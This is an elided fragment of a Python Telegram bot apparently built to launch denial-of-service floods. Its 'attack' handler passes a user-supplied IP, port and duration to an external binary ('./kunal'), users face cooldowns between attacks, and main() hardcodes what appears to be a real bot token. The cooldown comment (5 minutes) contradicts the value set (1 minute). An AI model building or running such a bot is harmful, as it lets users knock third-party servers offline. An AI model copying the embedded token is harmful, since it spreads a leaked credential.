...
cooldowns = {}
cooldown_period = timedelta(minutes=1)  # Cooldown of 5 minutes after attack
...
def attack(update: Update, context: CallbackContext) -> None:
    ...
    try:
        ...
        command = f"./kunal {ip} {port} {duration} 70"
...
def main():
    ...
    updater = Updater("8184252635:AAEDizfdtrZeDrske6WIXoBa74krKrLnC2Y", use_context=True)
